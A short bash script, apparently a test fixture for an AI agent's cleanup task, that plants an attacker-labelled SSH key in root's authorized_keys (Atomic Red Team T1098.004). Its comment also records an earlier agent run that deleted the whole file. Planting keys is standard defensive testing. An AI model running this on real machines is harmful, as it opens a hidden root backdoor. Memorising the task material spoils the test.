#!/bin/bash
# ART T1098.004 -- SSH Authorized Keys. Append an attacker-controlled key to root's
# authorized_keys, giving key-based root login alongside the key the machine already trusts. The
# two keys live in the same file, so the agent's job is to remove the attacker's one and leave the
# machine's own -- the discrimination that tripped an earlier episode, which deleted the whole file.
set -e
install -d -m 700 /root/.ssh
ssh-keygen -q -t ed25519 -N '' -C 'mallory@evil' -f /tmp/.mkey
cat /tmp/.mkey.pub >> /root/.ssh/authorized_keys
rm -f /tmp/.mkey /tmp/.mkey.pub
